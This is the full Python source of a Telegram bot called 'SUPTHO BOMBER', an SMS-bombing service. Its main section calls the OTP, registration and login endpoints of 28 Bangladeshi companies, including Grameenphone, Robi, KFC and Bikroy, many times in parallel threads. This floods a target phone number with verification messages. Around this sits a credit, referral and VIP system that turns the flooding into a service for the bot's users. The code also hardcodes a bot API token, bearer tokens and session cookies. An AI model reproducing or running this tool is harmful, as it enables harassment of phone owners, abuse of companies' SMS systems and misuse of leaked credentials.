import telebot
import requests
import threading
import os
import json
import random
import string
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Bot is Online!"

def run_web_server():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION (আপনার আইডি দিন)
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              # <--- আপনার সঠিক Numeric ID এখানে দিন
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "@Suptho1_"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'supreme_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (28 APIs)
# ==========================================

def gpfi_api(target):
    try:
        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
        headers = {"Host": "gpfi-api.grameenphone.com", "content-type": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 12; Infinix X669C)", "origin": "https://gpfi.grameenphone.com", "referer": "https://gpfi.grameenphone.com/"}
        payload = {"phone": target, "email": "", "language": "en"}
        requests.post(url, json=payload, headers=headers, timeout=3)
    except: pass

def chorcha_register_api(target):
    try:
        url = "https://mujib.chorcha.net/auth/register"
        headers = {"content-type": "application/json", "x-chorcha-platform": "web", "x-chorcha-mode": "api", "origin": "https://chorcha.net", "user-agent": "Mozilla/5.0"}
        rand_name = ''.join(random.choices(string.ascii_letters, k=6))
        payload = {"name": rand_name, "phone": target, "password": "Password123", "type": "ARTS", "level": "HSC_26", "school": "Dhaka College", "referral_code": None}
        requests.post(url, json=payload, headers=headers, timeout=3)
    except: pass

def beautybooth_api(target):
    try:
        url = "https://admin.beautybooth.com.bd/api/v2/auth/register"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://beautybooth.com.bd", "referer": "https://beautybooth.com.bd/"}
        requests.post(url, json={"value": target, "type": "phone", "token": 117}, headers=headers, timeout=3)
    except: pass

def sailor_api(target):
    try:
        url = "https://backend.sailor.clothing/api/v2/auth/signup"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://sailor.clothing", "referer": "https://sailor.clothing/"}
        rand_email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"
        requests.post(url, json={"country_code": "BD", "phone": target, "email": rand_email, "password": "Password123@", "password_confirmation": "Password123@"}, headers=headers, timeout=3)
    except: pass

def rangs_api(target):
    try:
        url = "https://ecom.rangs.com.bd/send-otp-code"
        headers = {"content-type": "application/json", "authorization": "Bearer", "user-agent": "Mozilla/5.0", "origin": "https://shop.rangs.com.bd", "referer": "https://shop.rangs.com.bd/"}
        requests.post(url, json={"mobile": f"+88{target}", "type": 1}, headers=headers, timeout=3)
    except: pass

def binge_api(target):
    try:
        url = "https://api.binge.buzz/api/v4/auth/otp/send"
        headers = {"content-type": "application/json", "x-platform": "web", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJEVDFsSklRdHplaHBIWjZ3OTFYaGk0eEFFc0UyIiwicGhvbmUiOm51bGwsInN0YXR1cyI6ImZyZWUiLCJleHBpcmVzQXQiOm51bGwsImlzQW5vbiI6dHJ1ZSwibWlncmF0ZWQiOnRydWUsImlhdCI6MTc2OTAwMzg2NSwiZXhwIjoxNzcyNjAzODY1fQ.NaZKP30HWE8wxpybs9YhUnZ_pjcOtzoAy4OTMiNlIwY", "user-agent": "Mozilla/5.0", "origin": "https://binge.buzz", "referer": "https://binge.buzz/login"}
        requests.post(url, json={"phone": f"+88{target}"}, headers=headers, timeout=3)
    except: pass

def kfc_api(target):
    try:
        url = "https://kfcbd.com/livewire/message/home.login"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "x-csrf-token": "6A5frGBoqKpgV1VSz0ouL3Sfshn0NAdtJLTHhnIS", "x-livewire": "true", "origin": "https://kfcbd.com", "referer": "https://kfcbd.com/login", "cookie": "_fbp=fb.1.1769003597108.955889830933324146; XSRF-TOKEN=eyJpdiI6IlJ5V1lKZ3ozN0lKdTdzNGJVem1aUGc9PSIsInZhbHVlIjoia0pxdndnQk9iMTFJQXZFNFZKVXV1RVBMalpVK0tqQVNJZU9pM0JhL25MdEJGOER4N0FLUGQvYkJueEtIWndObGNtd1JuQ1hjd2ZzVDF2OWZXSGlyYWdBQXhrUHpaM0NLN0FKcEJOZVpHMUt6ZGN2aCtOZTl6blZHOHJsaGl4aVIiLCJtYWMiOiI4YTk3ZTkwODUyMmE4NTQzYWQ0M2VkZDNmZTEzNWI5ZTAwYWE2NGY3MWNmMTZlYzJkODg5NDg2NjhlODZhYjk4IiwidGFnIjoiIn0%3D; kfcbd_session=eyJpdiI6Ik5sek9TM3RwTVRqcGZyUHZ3VHIyZlE9PSIsInZhbHVlIjoiR2dYVkF5M0hqT0VSaHVzTHgrVXBMMzVYaDg3dks2MXFITjlrYi9jNGtnMXp1N1l2UlpiZ0xNcU9YVjczb2hGNUg0Y2FxOEFKbklIUmpnYm1saGh0REVMMlFSaDhLNGp0TmtsbmpvU0oxYnFYazRnQ0NDQjc2Wktna3kzZS9GR1YiLCJtYWMiOiJiZmJjNWNlNWExOTgwMjY3ZGMwM2ViZTdlODkwMGE1ODMzZWZjNzcxNzIwMTA3MTc2MTY1YjVjODI1MGMxY2Y1IiwidGFnIjoiIn0%3D"}
        payload = {"fingerprint": {"id":"gfHVWOQplqQw5g5ZY3FO","name":"home.login","locale":"en","path":"login","method":"GET","v":"acj"}, "serverMemo": {"children":[],"errors":[],"htmlHash":"56c21409","data":{"mobile":None,"step":1,"get_otp":None,"otp":None,"previous_url":"https://kfcbd.com/"},"dataMeta":[],"checksum":"aa83aaee6349b6a8e574096144e663c3440cf91cdb1c9e24c7d6893c6afbd663"}, "updates": [{"type":"syncInput","payload":{"id":"yfynf","name":"mobile","value": target}}, {"type":"callMethod","payload":{"id":"rp1t","method":"login","params":[]}}]}
        requests.post(url, json=payload, headers=headers, timeout=3)
    except: pass

def acs_api(target):
    try:
        url = "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://acsfutureschool.com", "referer": "https://acsfutureschool.com/"}
        requests.post(url, json={"phone": target}, headers=headers, timeout=3)
    except: pass

def bdtickets_api(target):
    try:
        url = "https://api.bdtickets.com/v1/auth"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://bdtickets.com", "referer": "https://bdtickets.com/"}
        requests.post(url, json={"createUserCheck": True, "phoneNumber": f"+88{target}", "applicationChannel": "WEB_APP"}, headers=headers, timeout=3)
    except: pass

def robi_api(target):
    try:
        url = "https://www.robi.com.bd/bn"
        headers = {"Host": "www.robi.com.bd", "Connection": "keep-alive", "sec-ch-ua-platform": '"Android"', "Next-Action": "7f4406e6c8a68caaa35cda690d810259f50cb53c3c", "User-Agent": "Mozilla/5.0 (Linux; Android 12; Infinix X669C)", "Accept": "text/x-component", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.robi.com.bd", "Referer": "https://www.robi.com.bd/bn"}
        data = f'[{"{"}"msisdn":"{target}"{"}"}]'
        requests.post(url, headers=headers, data=data, timeout=3)
    except: pass

def airtel_api(target):
    try:
        url = "https://www.bd.airtel.com/en"
        headers = {"Host": "www.bd.airtel.com", "Connection": "keep-alive", "sec-ch-ua-platform": '"Android"', "next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e", "User-Agent": "Mozilla/5.0", "Accept": "text/x-component", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.bd.airtel.com", "Referer": "https://www.bd.airtel.com/en"}
        data = f'[{"{"}"msisdn":"{target}"{"}"}]'
        requests.post(url, headers=headers, data=data, timeout=3)
    except: pass

def grameenphone_api(target):
    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f"msisdn={target}", timeout=3)
    except: pass

def apex_api(target):
    try: requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": target}, timeout=3)
    except: pass

def bikroy_api(target):
    try: requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", timeout=3)
    except: pass

def banglalink_api(target):
    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": target}, timeout=3)
    except: pass

def chorki_api(target):
    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def hoichoi_api(target):
    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{target}", "platform": "MOBILE_WEB"}, timeout=3)
    except: pass

def bioscope_api(target):
    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def bohubrihi_api(target):
    try: requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": target, "intent": "login"}, timeout=3)
    except: pass

def ecourier_api(target):
    try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=3)
    except: pass

def osudpotro_api(target):
    try: requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{target}", "deviceToken": "web", "language": "en", "os": "web"}, headers={"content-type": "application/json;charset=UTF-8"}, timeout=3)
    except: pass

def fundesh_api(target):
    try: requests.post("https://fundesh.com.bd/api/auth/resendOTP", json={"msisdn": target[-10:]}, headers={"content-type": "application/json; charset=UTF-8"}, timeout=3)
    except: pass

def paperfly_api(target):
    try:
        rand_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"full_name": "PF", "company_name": "Ex", "email_address": rand_email, "phone_number": target}, headers={"content-type": "application/json"}, timeout=3)
    except: pass

def sundarban_api(target):
    try:
        query = """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"""
        requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": target}}, "query": query}, headers={"content-type": "application/json"}, timeout=3)
    except: pass

def hishabee_api(target):
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={target}&country_code=88"
        headers = {"origin": "https://web.hishabee.business", "referer": "https://web.hishabee.business/", "user-agent": "Mozilla/5.0"}
        requests.post(url, headers=headers, timeout=3)
    except: pass

def shomvob_api(target):
    try:
        url = "https://backend-api.shomvob.co/api/v2/otp/phone"
        headers = {"content-type": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q", "user-agent": "Mozilla/5.0", "origin": "https://app.shomvob.co", "referer": "https://app.shomvob.co/auth/"}
        requests.post(url, json={"phone": f"88{target}", "is_retry": 0}, headers=headers, timeout=3)
    except: pass

def deeptoplay_api(target):
    try:
        url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://www.deeptoplay.com"}
        requests.post(url, json={"number": f"+88{target}"}, headers=headers, timeout=3)
    except: pass

def redx_api(target):
    try:
        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://redx.com.bd", "referer": "https://redx.com.bd/"}
        requests.post(url, json={"phoneNumber": target}, headers=headers, timeout=3)
    except: pass

def attack_executor(target, amount):
    # Total 28 APIs
    apis = [gpfi_api, chorcha_register_api, beautybooth_api, sailor_api, rangs_api, binge_api, kfc_api, acs_api, bdtickets_api, robi_api, grameenphone_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, ecourier_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, hishabee_api, shomvob_api, deeptoplay_api, redx_api]
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(amount):
            for run_api in apis:
                executor.submit(run_api, target)

# ==========================================
# 👑 ADMIN COMMANDS
# ==========================================

@bot.message_handler(commands=['admin', 'stats', 'gencodes', 'broadcast', 'ban', 'unban', 'addvip', 'removevip'])
def admin_panel(message):
    if int(message.from_user.id) != int(OWNER_ID):
        return
    
    cmd = message.text.split()
    if cmd[0] == '/admin':
        text = "👑 **ADMIN PANEL**\n\n/addvip <id> - Make VIP\n/removevip <id> - Remove VIP\n/gencodes <num> - Gen Codes\n/broadcast <msg> - Broadcast\n/ban <id> - Ban User"
        bot.reply_to(message, text)
    
    elif cmd[0] == '/addvip':
        if len(cmd) > 1:
            uid = cmd[1]
            if uid in db['users']:
                db['users'][uid]['plan'] = 'vip'
                save_data(db)
                bot.reply_to(message, f"✅ User {uid} is now VIP (Unlimited).")
                try: bot.send_message(uid, "🎉 Congratulations! You are now a VIP user. Unlimited bombing enabled!")
                except: pass
            else: bot.reply_to(message, "❌ User not found.")
            
    elif cmd[0] == '/removevip':
        if len(cmd) > 1:
            uid = cmd[1]
            if uid in db['users']:
                db['users'][uid]['plan'] = 'free'
                save_data(db)
                bot.reply_to(message, f"❌ User {uid} removed from VIP.")

    elif cmd[0] == '/stats':
        bot.reply_to(message, f"📊 **Stats:**\nUsers: {len(db['users'])}\nBanned: {len(db.get('banned', []))}\nCodes: {len(db.get('codes', []))}")
    
    elif cmd[0] == '/gencodes':
        try:
            num = int(cmd[1])
            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
            db.setdefault('codes', []).extend(new_codes)
            save_data(db)
            bot.reply_to(message, f"✅ Generated {num} Codes:\n`{', '.join(new_codes)}`", parse_mode='Markdown')
        except: bot.reply_to(message, "Usage: `/gencodes 5`")

    elif cmd[0] == '/broadcast':
        msg_text = message.text.replace("/broadcast ", "")
        if len(msg_text) < 2: return
        count = 0
        for u in db['users']:
            try: bot.send_message(u, f"📢 **ADMIN MESSAGE:**\n\n{msg_text}"); count += 1
            except: pass
        bot.reply_to(message, f"✅ Sent to {count} users.")

    elif cmd[0] == '/ban':
        if len(cmd) > 1:
            db.setdefault('banned', []).append(cmd[1]); save_data(db); bot.reply_to(message, f"✅ Banned {cmd[1]}")

    elif cmd[0] == '/unban':
        if len(cmd) > 1 and cmd[1] in db.get('banned', []):
            db['banned'].remove(cmd[1]); save_data(db); bot.reply_to(message, f"✅ Unbanned {cmd[1]}")

# ==========================================
# 🤖 USER INTERFACE (UPDATED)
# ==========================================

def is_joined(user_id):
    if int(user_id) == int(OWNER_ID): return True
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if uid in db.get('banned', []): return bot.reply_to(message, "🚫 Banned.")

    # ✅ Secure Start: Only init if user NOT in db
    if uid not in db['users']:
        referrer = args[1] if len(args) > 1 and args[1] in db['users'] else None
        if referrer and referrer != uid:
            db['users'][referrer]['credits'] += 5
            try: bot.send_message(referrer, "🎉 Referral Bonus: +5 Credits!")
            except: pass
        # Initialize new user
        db['users'][uid] = {"credits": 5, "plan": "free", "last_bonus": "2000-01-01 00:00:00"}
        save_data(db)

    # ✅ Add "🎁 Daily Bonus" button
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "👤 Profile")
    markup.add("🎁 Daily Bonus", "💰 Redeem Credit")
    markup.add("👥 Refer & Earn", "👑 Admin Support")
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER** 🔥", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def menu_logic(message):
    uid = str(message.from_user.id)
    if uid in db.get('banned', []): return
    if not is_joined(message.from_user.id):
        btn = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_ID.replace('@','')}"))
        return bot.reply_to(message, "❌ আগে চ্যানেলে জয়েন করুন!", reply_markup=btn)

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 নাম্বার দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    
    elif message.text == "👤 Profile":
        u = db['users'].get(uid, {})
        plan = u.get('plan', 'free').upper()
        cred = "Unlimited" if int(uid) == int(OWNER_ID) or plan == "VIP" else u.get('credits', 0)
        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💎 Plan: **{plan}**\n💰 Balance: `{cred}`", parse_mode='Markdown')
    
    # ✅ DAILY BONUS LOGIC
    elif message.text == "🎁 Daily Bonus":
        user_data = db['users'].get(uid, {})
        last_str = user_data.get('last_bonus', "2000-01-01 00:00:00")
        try:
            last_date = datetime.strptime(last_str, "%Y-%m-%d %H:%M:%S")
        except:
            last_date = datetime(2000, 1, 1)

        if datetime.now() > last_date + timedelta(days=1):
            db['users'][uid]['credits'] += 1
            db['users'][uid]['last_bonus'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_data(db)
            bot.reply_to(message, "🎉 **Daily Bonus Claimed!**\n💰 +1 Credit added.")
        else:
            next_claim = last_date + timedelta(days=1)
            bot.reply_to(message, f"⏳ **Wait for cooldown!**\nNext claim: {next_claim.strftime('%H:%M:%S')}")

    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 Invite link:\n`{link}`\n\nপ্রতি রেফারে ৫ ক্রেডিট।")
    
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem কোড দিন:")
        bot.register_next_step_handler(msg, process_redeem)

def ask_amount(message):
    target = message.text
    msg = bot.reply_to(message, "🔢 রাউন্ড (No Limit):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    u_data = db['users'].get(uid, {})
    is_vip = u_data.get('plan') == 'vip'
    
    try:
        amount = int(message.text)
        if int(uid) != int(OWNER_ID) and not is_vip:
            if u_data['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই! Refer বা Redeem করুন।")
            db['users'][uid]['credits'] -= 1; save_data(db)
        
        bot.reply_to(message, "🚀 বোম্বিং শুরু হয়েছে!")
        threading.Thread(target=attack_executor, args=(target, amount)).start()
    except: bot.reply_to(message, "❌ ভুল পরিমাণ!")

def process_redeem(message):
    code, uid = message.text.strip(), str(message.from_user.id)
    if code in db.get('codes', []):
        db['codes'].remove(code); db['users'][uid]['credits'] += 10; save_data(db)
        bot.reply_to(message, "✅ সফল! ১০ ক্রেডিট যোগ হয়েছে।")
    else: bot.reply_to(message, "❌ ভুল কোড।")

if __name__ == "__main__":
    keep_alive()
    try:
        bot.remove_webhook()
        print("Webhook removed!")
    except Exception as e:
        print(e)
    bot.polling(non_stop=True)
